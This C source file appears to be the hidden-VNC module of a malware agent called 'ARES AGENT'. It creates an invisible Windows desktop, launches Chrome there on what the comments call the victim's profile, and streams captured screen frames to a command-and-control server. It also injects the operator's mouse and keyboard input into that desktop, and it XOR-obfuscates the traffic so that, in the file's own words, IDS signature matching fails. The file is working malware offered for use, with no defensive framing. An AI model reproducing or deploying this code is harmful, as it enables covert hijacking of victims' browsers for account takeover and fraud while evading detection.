/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — Hidden VNC (hVNC) with Pixel Streaming
 *
 *  Architecture:
 *    1. CreateDesktopW → hidden desktop (invisible to user)
 *    2. CreateProcessW(lpDesktop) → Chrome on hidden desktop
 *    3. BitBlt → capture pixels from hidden desktop DC
 *    4. ZLIB compress → stream to C2 via WebSocket
 *    5. C2 receives → renders on HTML5 Canvas
 *    6. Operator sends keyboard/mouse → relay to hidden desktop
 *
 *  Protocol (C2 ↔ Agent):
 *    Agent→C2:  FRAME|width|height|compressed_data
 *    C2→Agent:  MOUSE|x|y|button
 *    C2→Agent:  KEY|vkcode|flags
 *    C2→Agent:  RESIZE|width|height
 * ═══════════════════════════════════════════════════════════════
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_resolve.h"
#include <stdio.h>
#include <string.h>
#include <wingdi.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ws2_32.lib")

/* ── hVNC State ── */

typedef struct _HVNC_STATE {
    HDESK   hDesktop;
    wchar_t desktopName[64];
    char    bot_id[64];
    DWORD   chromePID;
    HANDLE  hChromeProcess;
    SOCKET  streamSocket;
    HANDLE  hThread;
    int     width;
    int     height;
    int     fps;
    volatile BOOL running;
    BYTE*   prevFrame;
    int     prevFrameSize;
} HVNC_STATE;

static HVNC_STATE g_hvnc = { 0 };

/* ── Desktop Management ── */

static BOOL hvnc_create_desktop(void)
{
    /* Generate random desktop name */
    swprintf(g_hvnc.desktopName, 64, L"WinSta%04d", GetTickCount() % 10000);

    g_hvnc.hDesktop = CreateDesktopW(
        g_hvnc.desktopName,
        NULL, NULL, 0,
        DESKTOP_CREATEWINDOW | DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS |
        DESKTOP_SWITCHDESKTOP | GENERIC_ALL,
        NULL);

    if (!g_hvnc.hDesktop) return FALSE;

    g_hvnc.width = GetSystemMetrics(SM_CXSCREEN);
    g_hvnc.height = GetSystemMetrics(SM_CYSCREEN);
    if (g_hvnc.width == 0) g_hvnc.width = 1920;
    if (g_hvnc.height == 0) g_hvnc.height = 1080;

    return TRUE;
}

/* ── Launch Process on Hidden Desktop ── */

static BOOL hvnc_launch_chrome(void)
{
    /* Find Chrome */
    const wchar_t* chromePaths[] = {
        L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        NULL
    };

    const wchar_t* chromePath = NULL;
    for (int i = 0; chromePaths[i]; i++) {
        if (GetFileAttributesW(chromePaths[i]) != INVALID_FILE_ATTRIBUTES) {
            chromePath = chromePaths[i];
            break;
        }
    }

    if (!chromePath) return FALSE;

    /* Build command line with victim's profile */
    wchar_t cmdLine[1024];
    swprintf(cmdLine, 1024,
        L"\"%s\" --no-first-run --no-default-browser-check --disable-popup-blocking",
        chromePath);

    /* STARTUPINFOW with lpDesktop = hidden desktop */
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);
    si.lpDesktop = g_hvnc.desktopName;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW; /* Show on hidden desktop (invisible to user) */

    PROCESS_INFORMATION pi = { 0 };
    BOOL ok = CreateProcessW(
        NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE,
        NULL, NULL, &si, &pi);

    if (ok) {
        g_hvnc.chromePID = pi.dwProcessId;
        g_hvnc.hChromeProcess = pi.hProcess;
        CloseHandle(pi.hThread);
    }

    return ok;
}

/* ── Pixel Capture from Hidden Desktop ── */

/* Simple RLE compression for pixel data */
static int rle_compress(const BYTE* input, int input_len, BYTE* output, int output_max)
{
    int out_pos = 0;
    int i = 0;

    while (i < input_len && out_pos + 4 < output_max) {
        BYTE val = input[i];
        int run = 1;

        /* Count consecutive identical bytes */
        while (i + run < input_len && input[i + run] == val && run < 255)
            run++;

        if (run >= 3) {
            /* RLE: 0x00 count byte */
            output[out_pos++] = 0x00; /* escape */
            output[out_pos++] = (BYTE)run;
            output[out_pos++] = val;
            i += run;
        } else {
            /* Literal */
            if (val == 0x00) {
                output[out_pos++] = 0x00;
                output[out_pos++] = 1;
                output[out_pos++] = 0x00;
            } else {
                output[out_pos++] = val;
            }
            i++;
        }
    }

    return out_pos;
}

/* Delta encoding: only send changed pixels */
static int delta_encode(const BYTE* current, const BYTE* previous,
    int width, int height, int bpp,
    BYTE* output, int output_max)
{
    int stride = width * bpp;
    int total = stride * height;
    int out_pos = 0;

    if (!previous) {
        /* First frame: send everything, RLE compressed */
        return rle_compress(current, total, output, output_max);
    }

    /* Delta: XOR with previous frame, then RLE */
    BYTE* delta = (BYTE*)HeapAlloc(GetProcessHeap(), 0, total);
    int changed = 0;

    for (int i = 0; i < total; i++) {
        delta[i] = current[i] ^ previous[i];
        if (delta[i] != 0) changed++;
    }

    /* If less than 5% changed, send delta */
    if (changed < total / 20) {
        output[0] = 'D'; /* Delta marker */
        out_pos = 1;
        out_pos += rle_compress(delta, total, output + out_pos, output_max - out_pos);
    } else {
        /* Too many changes, send full frame */
        output[0] = 'F'; /* Full frame marker */
        out_pos = 1;
        out_pos += rle_compress(current, total, output + out_pos, output_max - out_pos);
    }

    HeapFree(GetProcessHeap(), 0, delta);
    return out_pos;
}

static int hvnc_capture_frame(BYTE* output, int output_max)
{
    /* Switch to hidden desktop temporarily for GDI access */
    HDESK oldDesktop = GetThreadDesktop(GetCurrentThreadId());
    SetThreadDesktop(g_hvnc.hDesktop);

    HDC hDesktopDC = OpenDesktopW(g_hvnc.desktopName, 0, FALSE,
        DESKTOP_READOBJECTS | GENERIC_READ) ? GetDC(NULL) : NULL;

    if (!hDesktopDC) {
        /* Fallback: use CreateDC */
        hDesktopDC = CreateDCW(L"DISPLAY", NULL, NULL, NULL);
    }

    if (!hDesktopDC) {
        SetThreadDesktop(oldDesktop);
        return 0;
    }

    int w = g_hvnc.width;
    int h = g_hvnc.height;
    int bpp = 3; /* RGB */

    /* Create compatible DC + bitmap */
    HDC hMemDC = CreateCompatibleDC(hDesktopDC);
    
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h; /* Top-down */
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24; /* RGB */
    bmi.bmiHeader.biCompression = BI_RGB;

    BYTE* pixels = NULL;
    HBITMAP hBitmap = CreateDIBSection(hMemDC, &bmi, DIB_RGB_COLORS,
        (void**)&pixels, NULL, 0);
    HBITMAP hOld = (HBITMAP)SelectObject(hMemDC, hBitmap);

    /* BitBlt: capture hidden desktop */
    BitBlt(hMemDC, 0, 0, w, h, hDesktopDC, 0, 0, SRCCOPY);

    /* Delta encode */
    int frameSize = w * h * bpp;
    int compressed = delta_encode(pixels, g_hvnc.prevFrame, w, h, bpp,
        output, output_max);

    /* Save current frame for next delta */
    if (!g_hvnc.prevFrame) {
        g_hvnc.prevFrame = (BYTE*)HeapAlloc(GetProcessHeap(), 0, frameSize);
        g_hvnc.prevFrameSize = frameSize;
    }
    memcpy(g_hvnc.prevFrame, pixels, frameSize);

    /* Cleanup */
    SelectObject(hMemDC, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDesktopDC);

    /* Restore original desktop */
    SetThreadDesktop(oldDesktop);

    return compressed;
}

/* ── Input Injection into Hidden Desktop ── */

static void hvnc_inject_mouse(int x, int y, int button)
{
    HDESK oldDesktop = GetThreadDesktop(GetCurrentThreadId());
    SetThreadDesktop(g_hvnc.hDesktop);

    INPUT input = { 0 };
    input.type = INPUT_MOUSE;
    input.mi.dx = (x * 65535) / g_hvnc.width;
    input.mi.dy = (y * 65535) / g_hvnc.height;
    input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;

    if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
    else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP;

    SendInput(1, &input, sizeof(INPUT));

    SetThreadDesktop(oldDesktop);
}

static void hvnc_inject_key(int vkCode, int flags)
{
    HDESK oldDesktop = GetThreadDesktop(GetCurrentThreadId());
    SetThreadDesktop(g_hvnc.hDesktop);

    INPUT input = { 0 };
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (WORD)vkCode;
    input.ki.dwFlags = (flags & 1) ? KEYEVENTF_KEYUP : 0;

    SendInput(1, &input, sizeof(INPUT));

    SetThreadDesktop(oldDesktop);
}

/* ── Streaming Thread ── */

static DWORD WINAPI hvnc_stream_thread(LPVOID param)
{
    AGENT_STATE* state = (AGENT_STATE*)param;
    g_hvnc.fps = 10; /* 10 FPS default */

    /* Allocate frame buffer (worst case: uncompressed) */
    int maxFrameSize = g_hvnc.width * g_hvnc.height * 3 + 1024;
    BYTE* frameBuffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, maxFrameSize);

    /* Connect to C2 streaming endpoint */
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    struct addrinfo hints = {0}, *result = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[16];
    snprintf(port_str, sizeof(port_str), "%d", 9091); /* hVNC streaming port */

    if (getaddrinfo(state->config.c2_endpoints[0], port_str, &hints, &result) != 0) {
        HeapFree(GetProcessHeap(), 0, frameBuffer);
        return 1;
    }

    g_hvnc.streamSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (connect(g_hvnc.streamSocket, result->ai_addr, (int)result->ai_addrlen) != 0) {
        freeaddrinfo(result);
        HeapFree(GetProcessHeap(), 0, frameBuffer);
        return 1;
    }
    freeaddrinfo(result);

    /* v3.2: Per-session XOR key for stream obfuscation.
     * Prevents IDS signature matching on plaintext protocol markers. */
    BYTE stream_key = (BYTE)((GetTickCount() * 0x41C64E6D + 0x3039) & 0xFF);
    if (stream_key == 0) stream_key = 0x7B;

    /* v3.3: Obfuscated handshake — no plaintext protocol markers.
     * Format: [4-byte XOR'd magic][XOR'd payload] — IDS can't pattern-match. */
    char handshake[256];
    int hlen = snprintf(handshake, sizeof(handshake), "S|%s|%d|%d|%02X\n",
        g_hvnc.bot_id, g_hvnc.width, g_hvnc.height, stream_key);
    /* XOR the entire handshake with stream_key to eliminate string signatures */
    for (int i = 0; i < hlen; i++) handshake[i] ^= stream_key;
    send(g_hvnc.streamSocket, handshake, hlen, 0);

    /* Wait for ACK from C2 */
    char ack[16];
    int ack_n = recv(g_hvnc.streamSocket, ack, sizeof(ack)-1, 0);
    if (ack_n <= 0) {
        HeapFree(GetProcessHeap(), 0, frameBuffer);
        closesocket(g_hvnc.streamSocket);
        return 1;
    }

    /* Main capture + stream loop */
    DWORD frameInterval = 1000 / g_hvnc.fps;

    while (g_hvnc.running) {
        DWORD start = GetTickCount();

        /* Check for incoming commands (non-blocking) */
        u_long available = 0;
        ioctlsocket(g_hvnc.streamSocket, FIONREAD, &available);

        if (available > 0) {
            char cmdBuf[256];
            int n = recv(g_hvnc.streamSocket, cmdBuf, sizeof(cmdBuf) - 1, 0);
            if (n <= 0) break; /* Connection lost */
            /* v3.3: XOR-decode input commands from C2 */
            for (int i = 0; i < n; i++) cmdBuf[i] ^= stream_key;
            cmdBuf[n] = '\0';

            /* Parse command: MOUSE|x|y|button or KEY|vk|flags */
            if (strncmp(cmdBuf, "MOUSE|", 6) == 0) {
                int x, y, button;
                if (sscanf(cmdBuf + 6, "%d|%d|%d", &x, &y, &button) == 3)
                    hvnc_inject_mouse(x, y, button);
            }
            else if (strncmp(cmdBuf, "KEY|", 4) == 0) {
                int vk, flags;
                if (sscanf(cmdBuf + 4, "%d|%d", &vk, &flags) == 2)
                    hvnc_inject_key(vk, flags);
            }
        }

        /* Capture frame */
        int frameLen = hvnc_capture_frame(frameBuffer + 16, maxFrameSize - 16);
        if (frameLen > 0) {
            /* v3.3: Binary frame header — no plaintext markers for IDS.
             * Format: [0xF0:1][width:2BE][height:2BE][frameLen:4BE] = 9 bytes
             * XOR'd with stream_key to eliminate signatures. */
            BYTE fhdr[9];
            fhdr[0] = 0xF0;
            fhdr[1] = (BYTE)(g_hvnc.width >> 8); fhdr[2] = (BYTE)(g_hvnc.width);
            fhdr[3] = (BYTE)(g_hvnc.height >> 8); fhdr[4] = (BYTE)(g_hvnc.height);
            fhdr[5] = (BYTE)(frameLen >> 24); fhdr[6] = (BYTE)(frameLen >> 16);
            fhdr[7] = (BYTE)(frameLen >> 8);  fhdr[8] = (BYTE)(frameLen);
            for (int i = 0; i < 9; i++) fhdr[i] ^= stream_key;

            /* XOR frame data */
            BYTE* fdata = frameBuffer + 16;
            for (int i = 0; i < frameLen; i++) fdata[i] ^= stream_key;

            send(g_hvnc.streamSocket, (char*)fhdr, 9, 0);
            send(g_hvnc.streamSocket, (char*)fdata, frameLen, 0);
        }

        /* Maintain FPS */
        DWORD elapsed = GetTickCount() - start;
        if (elapsed < frameInterval)
            Sleep(frameInterval - elapsed);
    }

    HeapFree(GetProcessHeap(), 0, frameBuffer);
    closesocket(g_hvnc.streamSocket);

    return 0;
}

/* ── Public API ── */

BOOL Ares_HVNC_Start(AGENT_STATE* state)
{
    if (g_hvnc.running) return TRUE;

    memset(&g_hvnc, 0, sizeof(HVNC_STATE));
    g_hvnc.streamSocket = INVALID_SOCKET;

    /* Copy bot_id for handshake */
    extern char g_bot_id_global[64];
    strncpy(g_hvnc.bot_id, g_bot_id_global, 63);

    /* 1. Create hidden desktop */
    if (!hvnc_create_desktop()) return FALSE;

    /* 2. Launch Chrome on it */
    if (!hvnc_launch_chrome()) {
        CloseDesktop(g_hvnc.hDesktop);
        return FALSE;
    }

    /* Wait for Chrome to initialize */
    Sleep(3000);

    /* 3. Start streaming thread */
    g_hvnc.running = TRUE;
    g_hvnc.hThread = CreateThread(NULL, 0, hvnc_stream_thread, state, 0, NULL);

    return g_hvnc.hThread != NULL;
}

void Ares_HVNC_Stop(void)
{
    g_hvnc.running = FALSE;

    /* Wait for thread to finish */
    if (g_hvnc.hThread) {
        WaitForSingleObject(g_hvnc.hThread, 5000);
        CloseHandle(g_hvnc.hThread);
    }

    /* Kill Chrome */
    if (g_hvnc.hChromeProcess) {
        TerminateProcess(g_hvnc.hChromeProcess, 0);
        CloseHandle(g_hvnc.hChromeProcess);
    }

    /* Close hidden desktop */
    if (g_hvnc.hDesktop) {
        CloseDesktop(g_hvnc.hDesktop);
    }

    /* Free frame buffer */
    if (g_hvnc.prevFrame) {
        HeapFree(GetProcessHeap(), 0, g_hvnc.prevFrame);
    }

    memset(&g_hvnc, 0, sizeof(HVNC_STATE));
}
